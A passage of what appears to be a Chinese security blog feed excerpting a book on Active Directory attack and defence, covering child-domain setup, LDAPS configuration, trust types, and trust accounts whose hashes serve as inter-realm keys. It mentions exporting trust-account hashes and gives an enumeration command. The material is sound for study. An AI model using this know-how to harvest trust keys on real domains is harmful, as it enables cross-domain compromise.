href="#2-子域beijing-xie-com安装" class="headerlink" title="2. 子域beijing.xie.com安装"></a>2. 子域beijing.xie.com安装</h2><p>首先在BJ-AD上设置静态的ip以及DNS服务器为xie.com的域控10.211.55.4。如图所示：</p><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1634379089718-7f546f4c-9996-4e26-981c-bcc550c54fdd.png" alt="img"></p><h3 id="1-安装AD-DS域服务和DNS服务-2"><a href="#1-安装AD-DS域服务和DNS服务-2" class="headerlink" title="(1) 安装AD DS域服务和DNS服务"></a>(1) 安装AD DS域服务和DNS服务</h3><p>这里安装ADDS域服务和DNS服务操作步骤和前面的一样，这里就不再赘述。</p><p>如图所示，显示安装完成。点击关闭即可。</p><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1634376158855-8d4c0320-a36b-4d05-861b-1f4c76abba33.png" alt="img"></p><h3 id="2-提升为域控制器-2"><a href="#2-提升为域控制器-2" class="headerlink" title="(2) 提升为域控制器"></a>(2) 提升为域控制器</h3><p>接下来就需要将该服务器提升为域控制器。我们可以在服务器管理器这里看到部署后配置，点击“将此服务器提升为域控制器”。如图所示：</p><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1634376247736-d699c5e1-7137-438c-9637-27fda3a91fc3.png" alt="img"></p><p>会弹出Active Directory域服务配置向导，这一步很重要。这里我们勾选将新域添加到现有林(E)。然后填入父域名xie.com和子域名beijing。这里还需要提供一个凭据，我们点击这里更改，填入xie.com的企业管理员账号密码作为有效凭据。然后点击下一步。如图所示：</p><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1634376481727-7962d2a2-b99f-4252-9058-2fa6e517a1d5.png" alt="img"></p><p>这里域功能级别手动勾选Windows Server 2012 R2，指定域控制器功能为“域控系统(DNS) 服务器(O)”和“全局编录(GC)(G)”。然后输入目录服务还原模式(DSRM)密码。</p><p>然后点击下一步。如图所示：</p><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1634376641375-a1f4a5b2-d0a7-4621-999d-6839e0691a5d.png" alt="img"></p><p>注：目录还原模式密码和域管理员密码不同。该模式主要是用来还原Active Directory数据库，该密码必须符合密码策略</p><p>然后这里到了DNS选项，默认勾选了“创建DNS委派(D)”，我们保持默认，然后点击下一步。如图所示：</p><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1634376677347-132b610b-eca5-46b9-9360-259b03581b0e.png" alt="img"></p><p>由于域名是beijing.xie.com，所以这里的NetBIOS域名默认填为BEIJING，我们保持默认，然后点击下一步。如图所示：</p><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1634376918871-bf00c203-7f6f-4dc6-b3f5-931a30dfe97e.png" alt="img"></p><p>这里的数据库文件夹、日志文件文件夹和SYSVOL文件夹我们保持默认即可，然后点击下一步。如图所示：</p><ul><li>数据库文件夹：用于存储活动目录数据库。</li><li>日志文件文件夹：用于存储活动目录数据库的变更记录，此记录文件可用来修复活动目录数据库。</li><li>SYSVOL文件夹：用于存储域共享文件(例如组策略相关的文件)。</li></ul><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1634376963479-af50bffb-4685-4ba5-b13b-bd997a4e0e83.png" alt="img"></p><p>这里会看到我们之前的选择和设置，如果没问题直接点击下一步即可。如图所示：</p><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1634377009683-50903b9e-ea74-48c3-afce-1e4d9b0e1f2b.png" alt="img"></p><p>然后这里会检查先决条件，只有先决条件没问题了才可以继续安装。如图所示，所有先决条件检查都通过，点击安装即可。</p><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1634377069340-2eff8927-1c5c-42be-927b-9843dc75a80c.png" alt="img"></p><p>之后服务器会重启，重启后登录。登录成功后，服务器管理器——&gt;工具——&gt;Active Directory用户和计算机。可以看到如图所示，说明子域beijing.xie.com域控制器搭建完成。</p><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1634379927428-b63ac121-7f1b-4b4f-bb46-d3bf5e4cbd27.png" alt="img"></p><p>并且在服务器管理器——&gt;工具——&gt;Active Directory域和信任关系中可以看到域之间的信任关系。如图所示：</p><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1634379949562-bf8270b3-d75f-41f5-8313-8ce93e641d2a.png" alt="img"></p><h1 id="将计算机加入域"><a href="#将计算机加入域" class="headerlink" title="将计算机加入域"></a>将计算机加入域</h1><p>搭建完域控后，我们就可以将机器加入域了。加入域的机器没有限制，PC机器和服务器均可。以下以Win10系统加入域xie.com为例。如果想让主机加入域中，首先将主机的DNS指向域控服务器的ip，并且确保两者之间能互通。如图所示：</p><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1634400455573-9383687a-48ab-41d4-b2bd-7548b594cee2.png" alt="img"></p><p>然后系统属性——&gt;计算机名——&gt;隶属于——&gt;域，填入域名xie.com，点击确定。如图所示：</p><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1634400553994-d26b7d5c-30d5-4813-8a8f-bf618e740f01.png" alt="img"></p><p>然后会弹出框进行认证。这里输入任何一个有效的域用户账号密码认证即可。点击确定。如图所示：</p><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1634400633210-e0b485ef-4ece-4387-a6f2-25d7b607036c.png" alt="img"></p><p>如图所示，提示加入域成功！然后重启电脑即可！</p><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1634400720441-486d5a47-b515-4b63-8d04-2f58f7e43c26.png" alt="img"></p><p>注：当计算机加入域后，系统会自动将域管理员组中的用户添加到本地管理员组中。计算机原来的账号为本地账号，无法访问域中的资源，也无法将这些本地用户修改为域用户。</p><h1 id="将计算机退出域"><a href="#将计算机退出域" class="headerlink" title="将计算机退出域"></a>将计算机退出域</h1><p>计算机要么是工作组计算机，要么是域中的计算机，不能同时属于域和工作组。因此，如果要将计算机退出域，只需要将计算机修改为隶属于工作组即可。</p><p>打开 系统属性——&gt;计算机名——&gt;隶属于——&gt;工作组，这里可以随便填一个名字即可，然后点击确定。如图所示：</p><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1634400902915-7241da4f-eac2-45e3-8be0-acd0f90b0f18.png" alt="img"></p><p>弹出提示框，点击确定。如图所示：</p><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1634400927590-974249dc-5934-472d-b15f-28307ae90735.png" alt="img"></p><p>然后输入任何一个有效域用户即可，点击确定。如图所示：</p><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1634400976567-83612384-afad-4b29-807e-da7e1a5aaaad.png" alt="img"></p><p>如图所示，提示加入WORKGROUP工作组，然后重启电脑即可退出域！</p><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1634401010017-fb1c6c3d-268e-42f4-b24f-3ab928da7455.png" alt="img"></p><h1 id="启用基于SSL的LDAP-LDAPS"><a href="#启用基于SSL的LDAP-LDAPS" class="headerlink" title="启用基于SSL的LDAP(LDAPS)"></a>启用基于SSL的LDAP(LDAPS)</h1><p>默认情况下，LDAP 通信未加密。这使得恶意用户能够使用网络监控软件查看传输中的数据包。这就是许多企业安全策略通常要求组织加密所有 LDAP 通信的原因。为了减少这种形式的数据泄露，微软提供了一个选项：您可以启用通过安全套接字层 (SSL)&#x2F;传输层安全性 (TLS) 的 LDAP，也称为 LDAPS。利用 LDAPS，您可以提高整个网络的安全性。</p><p>以下实验以在Windows server 2012 R2域功能级别域控AD.xie.com为例安装ADCS服务。</p><h2 id="1-安装证书服务ADCS"><a href="#1-安装证书服务ADCS" class="headerlink" title="1. 安装证书服务ADCS"></a>1. 安装证书服务ADCS</h2><p>打开服务器管理器——&gt;添加角色和功能。如图所示：</p><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1634401413597-3f623d1d-72b8-4674-946b-5a73654c1141.png" alt="img"></p><p>选择“基于角色或基于功能的安装”选项，然后点击下一步。如图所示：</p><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1634401430043-938420d1-1d69-4858-bd10-63e4f389bcf1.png" alt="img"></p><p>选择“从服务器池中选择服务器”选项，然后点击下一步。如图所示：</p><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1634401443695-cd31f496-e0e2-4443-8784-69ce4a886771.png" alt="img"></p><p>这里勾选“Active Directory证书服务”选项，然后点击下一步。如图所示：</p><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1634401468790-13fbea27-ba4b-41c1-be92-f08abe0ce14f.png" alt="img"></p><p>这里到了选择功能的对话框，保持默认即可，然后点击下一步。如图所示：</p><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1634401479560-6de89206-38ef-4a4b-b7dc-8e87fa2136e7.png" alt="img"></p><p>这里显示Active Directory域服务的描述以及注意事项。然后点击下一步。如图所示：</p><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1634401489385-304e7671-cf78-489a-962d-f154864e735c.png" alt="img"></p><p>这里勾选“证书颁发机构”选项，如果想要允许Web端注册证书的话，也可以勾选“证书颁发机构Web注册”。如图所示：</p><p>ADCS支持6种角色服务：</p><ul><li><p>证书颁发机构：该组件的主要目的是办法证书、撤销证书以及发布授权信息访问(AIA)和撤销信息。</p></li><li><p>联机响应程序：可以使用该组件来配置和管理在线证书状态协议(OSCP)验证和吊销检查。在线响应程序解码特定证书的吊销状态请求，评估这些证书的状态，并返回具有请求的证书状态信息的签名响应。</p></li><li><p>网络设备注册服务(NDES)：通过该组件，路由器、交互机和其他网络设备可从ADCS获取证书</p></li><li><p>证书颁发机构Web注册：该组件提供了一种用户使用未加入域或运行Windows以外操作系统的设备的情况下颁发和续订证书的方法。</p></li><li><p>证书注册Web服务(CES)：该组件用于运行Windows的计算机和CA之间的代理客户端。CES使用户、计算机或应用程序能够通过使用Web服务连接到CA：</p></li><li><ul><li>请求、更新和安装办法的证书</li><li>检索证书吊销列表(CRL)</li><li>下载根证书</li><li>通过互联网或跨森林注册</li><li>为属于不受信任的ADDS域或未加入域的计算机自动续订证书</li></ul></li><li><p>证书注册策略Web服务：该组件使用户能够获取证书注册策略信息。结合CES，它可以在用户设备未加入域或无法连接到域控的场景下实现基于策略的证书服务</p></li></ul><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1634401513611-815ed600-0953-46a1-8567-1c9fc07af86c.png" alt="img"></p><p>这里Web服务器角色(IIS)描述以及注意事项，然后点击下一步。如图所示：</p><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1634401525480-a793e648-4885-4379-89ed-f669db662862.png" alt="img"></p><p>显示选择角色服务，保持默认即可。然后点击下一步，如图所示：</p><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1634401544190-3027c265-e9d6-48b0-8a7e-1fc52cf6ee8c.png" alt="img"></p><p>这里到了确认安装所选内容对话框，勾选“如果需要，自动重新启动目标服务器”选项，然后点击安装。如图所示：</p><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1634401557557-42dc8741-5915-4a47-940b-3a1352a7f560.png" alt="img"></p><p>如下所示，显示安装完成，点击关闭即可。如图所示：</p><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1634401659712-e4f318c0-d727-452a-9298-9cd50605b770.png" alt="img"></p><h2 id="2-配置ADCS"><a href="#2-配置ADCS" class="headerlink" title="2. 配置ADCS"></a>2. 配置ADCS</h2><p>接下来就需要配置ADCS证书服务了，点击“配置目标服务器上的Active Directory证书服务”。如图所示：</p><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1634401685462-bc2dd85d-b127-4b2c-a0c7-ae2d31f30be1.png" alt="img"></p><p>会弹出指定凭据以配置角色服务对话框，这里我们保持默认，然后点击下一步。如图所示：</p><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1634401697133-de223a28-2d92-468e-b16f-77b5dcc448d0.png" alt="img"></p><p>勾选“证书颁发机构”和“证书颁发机构Web注册”，然后点击下一步。如图所示：</p><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1634401722024-5c0e2630-0f6e-4968-95d1-0154e47f232d.png" alt="img"></p><p>勾选“企业CA(E)”，然后点击下一步。如图所示：</p><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1634401735838-31ccb64e-b7ee-42d2-940a-e8434dc03af2.png" alt="img"></p><p>勾选“根CA(R)”，然后点击下一步。如图所示：</p><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1634401749990-a0c1896d-f08d-4544-b004-f8020d749996.png" alt="img"></p><p>勾选“创建新的私钥(R)”，然后点击下一步。如图所示：</p><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1634401763112-e3ad8b9d-ab63-4340-a516-703ffe85ac97.png" alt="img"></p><p>指定加密选项，我们保持默认即可，然后点击下一步。如图所示：</p><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1634401782941-ece617ed-641e-4a2d-97f7-0644ae4ff5f5.png" alt="img"></p><p>指定CA名称，我们保持默认即可，然后点击下一步。如图所示：</p><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1634401796442-4cc9896d-ff1c-4757-8874-13c1b21d01a7.png" alt="img"></p><p>有效期我们保持默认即可，然后点击下一步。如图所示：</p><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1634401809778-3e1d5400-8c02-42c8-af51-43a23dfddc64.png" alt="img"></p><p>CA数据库的存储位置，我们保持默认即可，然后点击下一步。如图所示：</p><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1634401826699-a2c8d311-d88a-427f-8035-074e82144490.png" alt="img"></p><p>然后确认以下信息是否有误，无误的话，点击配置。如图所示：</p><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1634401837694-5393444d-7070-47fd-9719-3eecf4f8ef25.png" alt="img"></p><p>如图所示，配置完成。</p><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1634401853475-b3b97ed6-c1c2-4df9-a87c-b0011db6ea4e.png" alt="img"></p><p>至此，已经完成了LDAPS的配置了。可以使用ldp.exe来验证，如图所示，配置连接参数。</p><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1634401953465-0ec48e3d-f628-4a86-ac78-e589ef6efa1f.png" alt="img"></p><p>如图所示，打开 ldaps:&#x2F;&#x2F;AD.xie.com&#x2F; 成功。</p><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1634401931826-ff3d1273-1cc5-4729-86ea-2f987042780a.png" alt="img"></p><p>非常感谢您读到现在，由于作者的水平有限，编写时间仓促，文章中难免会出现一些错误或者描述不准确的地方，恳请各位师傅们批评指正。如果你想一起学习AD域安全攻防的话，可以加入下面的知识星球一起学习交流。</p><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/640-20230306214031031.png" alt="图片"></p><p>官方：<a href="https://docs.microsoft.com/zh-cn/windows-server/identity/ad-ds/active-directory-functional-levels">林和域功能级别</a></p>]]></content>
      
      
      <categories>
          
          <category> 技术文章 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 域渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>域信任</title>
      <link href="2022/03/10/yu-shen-tou-gong-fang/yu-xin-ren/"/>
      <url>2022/03/10/yu-shen-tou-gong-fang/yu-xin-ren/</url>
      
        <content type="html"><![CDATA[<p>本文部分节选于《域渗透攻防指南》，购买请长按如下图片扫码</p><p><img src="/2022/03/10/yu-shen-tou-gong-fang/yu-xin-ren/image-20230307171045743.png" alt="image-20230307171045743"></p><p>域信任(Domain Trust)是为了解决多域环境下的跨域资源共享问题而诞生的。两个域之间必须拥有信任关系(Trust Relationship)，才可以互相访问到对方域内的资源。由于此信任工作是通过Kerberos协议来完成的，因为也被成为Kerberos Trust。</p><p>域信任作为一种机制，允许另一个域的用户在通过身份验证后访问本域内的资源。同时，域信任利用DNS服务器定位两个不同子域的域控制器，如果两个域中的域控制器都无法找到另一个域，那么也就不存在通过域信任关系进行跨域资源共享了。</p><h1 id="单向信任、双向信任和快捷信任"><a href="#单向信任、双向信任和快捷信任" class="headerlink" title="单向信任、双向信任和快捷信任"></a>单向信任、双向信任和快捷信任</h1><p>域信任关系可以分为单向信任、双向信任和快捷信任。</p><h2 id="1-单向信任"><a href="#1-单向信任" class="headerlink" title="1. 单向信任"></a>1. 单向信任</h2><p>单向信任是指在两个域之间创建单向的信任路径，即在一个方向上是信任流，在另一个方向上是访问流。在信任域和受信任域之间的单向信任中，受信任域内的用户或计算机可以访问信任域中的资源，但信任域内的用户或计算机却无法访问受信任域内的资源。</p><p>如图所示单向信任域架构，域A信任域B和域C，那么域B内和域C内受信任的主体可以访问域A内的资源，但域A内的主体却无法访问域B和域C内的资源。</p><p><img src="/2022/03/10/yu-shen-tou-gong-fang/yu-xin-ren/1635911499099-fea452f7-f0fa-4f8e-b755-03337b46735c.png" alt="img"></p><h2 id="2-双向信任"><a href="#2-双向信任" class="headerlink" title="2. 双向信任"></a>2. 双向信任</h2><p>双向信任是指两个单向信任的组合，信任域和受信任域彼此信任，在两个方向上都有信任流和访问流。这意味着，可以从两个方向在两个域之间传递身份验证请求。活动目录中的所有域信任关系都是双向可传递信任的。任何一个新的子域加入到域林之后，这个域会自动信任其上一层的父域，同时父域也会自动信任新子域，这种信任关系称为父子信任；由于这些信任关系具备双向传递性(Two-Way Transitive)，因此林根域和其他树根域之间也会自动双向信任，这称为树信任。在早期的域中，域信任是单向的，从Windows Server2003开始，域信任关系变为双向的。</p><p>如图所示双向信任域架构：域A和域B、域C之间都是双向信任关系；域A信任域B，域B也信任域A；域A信任域C，域C也信任域A。所以当任何一个新域加入到域树后，默认它会自动的建立起双向信任的关系。因此只要拥有任何一个域内的权限，那么就可以访问其他域内的资源了。</p><p><img src="/2022/03/10/yu-shen-tou-gong-fang/yu-xin-ren/1644390734429-dfbd6003-21c2-4df7-ac3a-baf3ac1cb203.png" alt="img"></p><h2 id="3-快捷信任"><a href="#3-快捷信任" class="headerlink" title="3. 快捷信任"></a>3. 快捷信任</h2><p>快捷信任其实属于双向信任，快捷信任是指两个子域之间的信任。</p><p>如图所示，域A信任域B，域B也信任域A；域A信任域C，域C也信任域A。此时域B和域C之间也有双向信任关系。由于域是树状结构，如果域B到域C双向信任，需要先经过林根域A，这中间肯定会多很多认证流程和步骤。因此，域B和域C之间默认建立起了一个快捷信任。</p><p><img src="/2022/03/10/yu-shen-tou-gong-fang/yu-xin-ren/1644390692062-4c06cd77-2bcd-4265-b9d4-6a9b8bc83dc3.png" alt="img"></p><h1 id="内部信任、外部信任和林信任"><a href="#内部信任、外部信任和林信任" class="headerlink" title="内部信任、外部信任和林信任"></a>内部信任、外部信任和林信任</h1><p>域信任根据作用范围还可以分为内部信任、外部信任和林信任；内部信任是相对于同一个林来说的，而外部信任和林信任则是相对于不同林来说的。</p><h2 id="1-内部信任"><a href="#1-内部信任" class="headerlink" title="1. 内部信任"></a>1. 内部信任</h2><p>在默认情况下，使用活动目录安装向导将新域添加到林根域中时，会自动创建双向可传递信任。在现有林中创建域时，将建立新的林根信任。当前域林中的两个或多个域之间的信任关系称为内部信任。这种信任关系是可以传递的。</p><p>如图所示，是内部信任架构图：</p><p><img src="/2022/03/10/yu-shen-tou-gong-fang/yu-xin-ren/1635922429312-3f1e9c91-57ad-490f-a0c1-9e44bda03bd4.png" alt="img"></p><h2 id="2-外部信任"><a href="#2-外部信任" class="headerlink" title="2. 外部信任"></a>2. 外部信任</h2><p>外部信任是指两个不同林间的域信任关系，外部信任是单向或双向不可传递的。比如两个林之间需要跨域资源访问，因此有必要建立外部信任。创建外部信任需要在两个域的DNS中设置互相指向对方的条件转发器，确保能正确解析到目标的地址。</p><p>如图所示，是外部信任架构图：</p><p><img src="/2022/03/10/yu-shen-tou-gong-fang/yu-xin-ren/1635921202391-bdc9d7af-dffe-4b09-9969-b6380de246a4.png" alt="img"></p><h2 id="3-林信任"><a href="#3-林信任" class="headerlink" title="3. 林信任"></a>3. 林信任</h2><p>林信任也是指两个不同林间的域信任关系，林信任给两个林中的域之间提供双向的可传递信任关系。比如两个林中有很多域，要进行跨域资源访问的话就需要设置很多次，为了简化操作，可以设置林信任，林信任是自Windows Server 2003起拥有的信任关系。创建林信任需要在两个域的DNS中设置互相指向对方的条件转发器，确保能正确解析到目标的地址。林信任只能在两个林之间创建，不能隐式扩展到第三个林。比如在林1和林2之间创建了一个林信任，在林2和林3之间也创建了一个林信任，则林1和林3之间没有隐式信任关系。</p><p>如图所示，是林信任架构图：</p><p><img src="/2022/03/10/yu-shen-tou-gong-fang/yu-xin-ren/1635922361608-c529c2fb-c2ac-497e-9503-e62e5ddbd448.png" alt="img"></p><h1 id="跨域资源访问"><a href="#跨域资源访问" class="headerlink" title="跨域资源访问"></a>跨域资源访问</h1><p>跨域是如何进行资源访问的呢？</p><p>对于同域内的资源访问，可以参考1.1章讲的Kerberos协议篇。</p><p>如图所示，域内访问资源简要概括为6步：</p><p><img src="/2022/03/10/yu-shen-tou-gong-fang/yu-xin-ren/1635944913816-470e1f27-eee8-465b-a19e-af0bca6102d6.png" alt="img"></p><p>那么，可能我们会猜想，跨域进行资源访问是不是也是类似呢？</p><p>我们猜想跨域资源访问如图所示，但是仔细思考一下就知道应该不是这样。首先A域域控没有B域资源服务器的hash，因此无法生成B域资源的ST服务票据。其次，B域域控没有A域的krbtgt哈希，因此无法验证PAC。所以以下访问流程是行不通的。</p><p><img src="/2022/03/10/yu-shen-tou-gong-fang/yu-xin-ren/1635944971706-c0d2089a-e698-4843-8a19-5d65efa57e3f.png" alt="img"></p><p>事实上，为了进行跨域间的身份验证，微软提出了inter-realm key(跨域间密钥)的概念。不同域间的域控制器必须共享一个inter-realm key。然后，这些域可以相互信任。inter-realm key默认每隔30天重置一次。这个inter-realm key是Windows 2000和Windows Server 2003中传递信任的基础。</p><p>真实的跨域资源访问流程如图所示：</p><p><img src="/2022/03/10/yu-shen-tou-gong-fang/yu-xin-ren/1643082564684-453e24d9-46b6-457c-a5ec-0584fe60a305.png" alt="img"></p><h2 id="1-信任帐户"><a href="#1-信任帐户" class="headerlink" title="1. 信任帐户"></a>1. 信任帐户</h2><p>在每个域内，都有一个信任帐户，该帐户以$结尾，该帐户的哈希就是inter-realm key值。</p><p>如图所示域树，域A内的信任帐户为域B和域C的前缀，也就是SHANGHAI$和BEIJING$。在域B内和域C内的信任帐户均为XIE$，只不过前缀不同(shangxie\XIE$、beijing\XIE$)。</p><p><img src="/2022/03/10/yu-shen-tou-gong-fang/yu-xin-ren/1635951182385-315499a5-95b7-4a0a-8de2-71e931280f0b.png" alt="img"></p><p>使用如下powershell命令即可查询当前域内的信任帐户：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">Get<span class="token operator">-</span>ADUser <span class="token operator">-</span><span class="token builtin">filter</span> <span class="token operator">*</span> <span class="token operator">-</span>Properties DistinguishedName<span class="token punctuation">,</span>samAccountType <span class="token operator">|</span> ?<span class="token punctuation">&#123;</span>$_<span class="token punctuation">.</span>name <span class="token operator">-</span>like <span class="token string">"*$"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如图所示，可以看到在域xie.com内的信任帐户是SHANGHAI$和BEIJING$。</p><p><img src="/2022/03/10/yu-shen-tou-gong-fang/yu-xin-ren/1635951327761-eb4370e3-e5a8-4fb9-b911-9aef5efbde49.png" alt="img"></p><p>如图所示，可以看到在域shanghai.xie.com内的信任帐户是XIE$。</p><p><img src="/2022/03/10/yu-shen-tou-gong-fang/yu-xin-ren/1635951407117-2f91a375-212a-4c78-8bfe-9ce427446571.png" alt="img"></p><p>如图所示，可以看到在域beijing.xie.com内的信任帐户是XIE$。</p><p><img src="/2022/03/10/yu-shen-tou-gong-fang/yu-xin-ren/1635951495295-e8c7dacf-d4f1-4ed2-97c5-fed078011889.png" alt="img"></p><p>也可以使用ADExplorer进行查看信任帐户。</p><p>如图所示，在域xie.com中可以看到信任帐户SHANGHAI$和BEIJING$。</p><p><img src="/2022/03/10/yu-shen-tou-gong-fang/yu-xin-ren/1635952096812-adb797a0-d37d-427d-9779-d3014383bed4.png" alt="img"></p><p>如图所示，在域shanghai.xie.com中可以看到信任帐户XIE$。</p><p><img src="/2022/03/10/yu-shen-tou-gong-fang/yu-xin-ren/1635952050162-eeb717ab-a0a0-42d1-9365-e05a3b3b782e.png" alt="img"></p><p>如图所示，在域beijing.xie.com中可以看到信任帐户XIE$。</p><p><img src="/2022/03/10/yu-shen-tou-gong-fang/yu-xin-ren/1635952015732-aa02472f-98bb-4a81-94d3-0ffedbf5fd23.png" alt="img"></p><p>注意：在Active Directory用户和计算机处是看不到信任帐户的。</p><p>并且信任帐户的哈希值具有如下关系：</p><ul><li>xie\SHANGHAI$ &#x3D; shangxie\XIE$</li><li>xie\BEIJING$ &#x3D; beijing\XIE$</li></ul><p>如图所示，导出域xie.com内的信任帐户xie\SHANGHAI$ 和 xie\BEIJING$的哈希值。</p><p><img src="/2022/03/10/yu-shen-tou-gong-fang/yu-xin-ren/1635951689596-0ede9a9c-c0de-46d6-ba41-d8b9d3ad0a7b.png" alt="img"></p><p>如图所示，分别导出域shanghai.xie.com内的信任帐户shanghai\XIE$ 和 域beijing.xie.com内的信任帐户beijing\XIE$的哈希值。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/12919237/1635951751115-762510ef-11db-4f1a-b39e-7cf6c6d25541.png" alt="img"></p><p>从上图可以看到xie\SHANGHAI$的哈希值等于shanghai\XIE$的哈希值，而xie\BEIJING$的哈希值等于beijing\XIE$的哈希值。</p><p>非常感谢您读到现在，由于作者的水平有限，编写时间仓促，文章中难免会出现一些错误或者描述不准确的地方，恳请各位师傅们批评指正。如果你想一起学习AD域安全攻防的话，可以加入下面的知识星球一起学习交流。</p><p><img src="/2022/03/10/yu-shen-tou-gong-fang/yu-xin-ren/640-20230306214031031.png" alt="图片"></p><p>相关文章：<a href="https://adsecurity.org/?p=1588">https://adsecurity.org/?p=1588</a></p><p><a href="https://www.docin.com/p-1934536626.html">https://www.docin.com/p-1934536626.html</a></p><p><a href="https://blog.csdn.net/include_heqile/article/details/102537646">https://blog.csdn.net/include_heqile/article/details/102537646</a></p><p><a href="https://blog.csdn.net/include_heqile/article/details/102651677">https://blog.csdn.net/include_heqile/article/details/102651677</a></p>]]></content>
      
      
      <categories>
          
          <category> 技术文章 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 域渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>域中常见名词</title>
      <link href="2022/03/07/yu-shen-tou-gong-fang/yu-zhong-chang-jian-ming-ci/"/>
      <url>2022/03/07/yu-shen-tou-gong-fang/yu-zhong-chang-jian-ming-ci/</url>
      
        <content type="html"><![CDATA[<p>本文部分节选于《域渗透攻防指南》，购买请长按如下图片扫码</p><p><img src="/2022/03/07/yu-shen-tou-gong-fang/yu-zhong-chang-jian-ming-ci/image-20230306213529401.png" alt="image-20230306213529401"></p><p>在学习域的过程中，我们经常会碰到一些专有名词，如：AD、CN、OU、DN等。本文主要讲解一些经常碰到的名词的含义。</p><h1 id="AD"><a href="#AD" class="headerlink" title="AD"></a>AD</h1><p>AD是Active Directory活动目录的缩写。我们先来看看什么是活动目录，日常生活中我们的电话本记录着亲朋好友的电话和姓名等数据，这就是Telephone Directory电话目录；计算机中的文件系统记录着文件的文件名、大小和日期等数据，这就是File Directory文件目录。而Active Directory活动目录是微软对通用目录服务的实现，它使用LDAP作为其主要访问协议。活动目录存储着有关网络中各种对象的信息，如用户帐户、计算机帐户、组和Kerberos使用的所有相关凭据等信息。活动目录让管理员和用户能够轻松地查找和使用这些信息。活动目录服务(AD DS，Active Directory Domain Service)是Windows Server 2000操作系统平台的中心组件之一，活动目录可以作为活动目录域服务(ADDS)或活动目录轻型目录服务(ADLDS)部署。活动目录使用了一种结构化的数据存储方式，并以此作为基础对目录信息进行合乎逻辑的分层组织。</p><p>所以可以看出，Active 